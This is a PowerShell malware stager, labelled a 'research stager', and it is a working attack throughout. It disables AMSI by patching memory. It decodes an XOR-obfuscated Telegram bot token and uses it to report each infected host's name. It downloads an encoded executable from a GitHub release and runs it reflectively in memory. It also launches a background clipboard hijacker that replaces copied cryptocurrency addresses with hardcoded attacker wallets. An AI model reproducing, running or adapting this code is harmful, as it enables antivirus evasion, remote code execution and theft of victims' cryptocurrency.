# --- [ELITE RESEARCH STAGER v30.0: GHOST MEMORY INJECTION] ---

function Global-Initialize {
    # Advanced Memory Patching to disable AMSI in the current process RAM
    $m = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $m.GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]::Zero)
}

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $url = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
}

Global-Initialize
Send-Ping -m "V30_GHOST_MEMORY_ACTIVE_ON_$($env:COMPUTERNAME)"

try {
    # 1. RAM-ONLY DOWNLOAD & DECRYPT
    $u = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    
    # Download directly into a variable (RAM), not a file
    $raw = $wc.DownloadString($u)
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }

    # 2. REFLECTIVE LOAD (Advanced Gap)
    # This loads the EXE bytes directly into the PowerShell process space
    $Assembly = [System.Reflection.Assembly]::Load($data)
    $EntryPoint = $Assembly.EntryPoint
    if ($EntryPoint) {
        # Launching the main method of your EXE inside the RAM of PowerShell
        $EntryPoint.Invoke($null, @(,[string[]]@()))
    }

    # 3. CLIPPER ENGINE (Persistent in Background Job)
    $C = {
        Add-Type -AssemblyName System.Windows.Forms
        $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
        while($true) {
            try {
                if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                    $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
                    if ($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$") { if ($v -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) } }
                    elseif ($v -match "^0x[a-fA-F0-9]{40}$") { if ($v -ne $w.eth) { [System.Windows.Forms.Clipboard]::SetText($w.eth) } }
                    elseif ($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$") { if ($v -ne $w.usdt) { [System.Windows.Forms.Clipboard]::SetText($w.usdt) } }
                    elseif ($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$") { if ($v -ne $w.sol) { [System.Windows.Forms.Clipboard]::SetText($w.sol) } }
                }
            } catch {}
            Start-Sleep -Milliseconds 500
        }
    }
    Start-Job -ScriptBlock $C | Out-Null

    Send-Ping -m "V30_DEPLOYMENT_COMPLETE_NO_DISK_TRACE"
} catch {
    Send-Ping -m "V30_FATAL: $($_.Exception.Message)"
}
